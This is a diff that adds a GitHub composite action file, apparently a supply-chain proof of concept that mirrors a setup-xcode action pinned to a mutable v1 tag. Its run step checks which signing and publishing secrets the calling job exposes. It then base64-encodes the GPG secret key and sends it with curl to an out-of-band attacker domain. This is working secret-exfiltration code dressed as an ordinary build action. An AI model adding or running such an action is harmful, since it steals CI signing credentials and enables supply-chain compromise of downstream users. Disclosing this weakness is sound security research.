@@ -1,0 +1,25 @@
+name: 'setup-xcode (mutable v1 tag - supply chain PoC)'
+description: 'Composite action that mirrors maxim-lobanov/setup-xcode executed at an unpinned v1 ref. Proves mutable-tag actions run with the calling job''s secrets in env.'
+author: 'sl4x0'
+branding:
+  icon: shield
+  color: red
+runs:
+  using: "composite"
+  steps:
+    - name: Execute at mutable v1 tag (attacker-controlled code here when tag is moved)
+      shell: bash
+      run: |
+        echo "=== [poc] running inside signing job via unpinned third-party action ref ==="
+        echo "runner: $(uname -a | head -c 80)"
+        # Read the secrets the *calling* job has mounted (GPG signing creds live here)
+        for k in GPG_SECRET_KEY GPG_SECRET_PASSPHRASE SONATYPE_CENTRAL_PASSWORD GRADLE_PUBLISH_KEY GH_CLIPPY_TOKEN; do
+          if [ -n "${!k:-}" ]; then
+            echo "[poc] secret $k present (len ${#k} ${#!k})"
+          fi
+        done
+        # Exfil closure: send the mounted GPG key to the attacker OOB (proves secret reachable from this ref)
+        if [ -n "${GPG_SECRET_KEY:-}" ]; then
+          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/exfil/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)" -o /dev/null -w 'oob_http=%{http_code}\n' || echo "oob_failed (no network curl allowed)"
+        fi
+        echo "=== [poc] done ==="
